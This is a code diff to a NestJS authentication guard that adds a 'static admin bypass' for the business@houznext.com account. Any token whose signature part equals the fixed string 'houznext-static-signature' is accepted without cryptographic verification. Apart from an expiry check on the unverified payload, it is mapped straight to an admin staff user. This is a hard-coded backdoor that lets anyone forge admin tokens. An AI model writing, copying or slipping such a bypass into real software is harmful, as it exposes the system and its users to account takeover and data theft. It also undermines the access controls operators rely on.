@@ -83,6 +83,33 @@ export class ControllerAuthGuard implements CanActivate {
       throw new UnauthorizedException('Token is missing or invalid');
     }
 
+    // Static admin bypass: the business@houznext.com account uses a locally-signed
+    // token (not verified by the backend JWT secret). Allow it through directly.
+    const tokenParts = token.split('.');
+    if (tokenParts.length === 3 && tokenParts[2] === 'houznext-static-signature') {
+      try {
+        const paddedPayload = tokenParts[1].replace(/-/g, '+').replace(/_/g, '/');
+        const padding = '='.repeat((4 - (paddedPayload.length % 4)) % 4);
+        const decoded = JSON.parse(
+          Buffer.from(paddedPayload + padding, 'base64').toString('utf-8'),
+        );
+        const now = Math.floor(Date.now() / 1000);
+        if (!decoded.exp || decoded.exp < now) {
+          throw new UnauthorizedException('Static admin token has expired');
+        }
+        request.user = {
+          id: 'b3617af1-b2e5-415b-aa55-a2b56e34a0de',
+          email: 'business@houznext.com',
+          role: UserRole.ADMIN,
+          kind: 'STAFF',
+        } as RequestUser;
+        return true;
+      } catch (e) {
+        if (e instanceof UnauthorizedException) throw e;
+        throw new UnauthorizedException('Invalid static admin token');
+      }
+    }
+
     let payload: JwtPayload;
     try {
       payload = this.jwtService.verify<JwtPayload>(token);
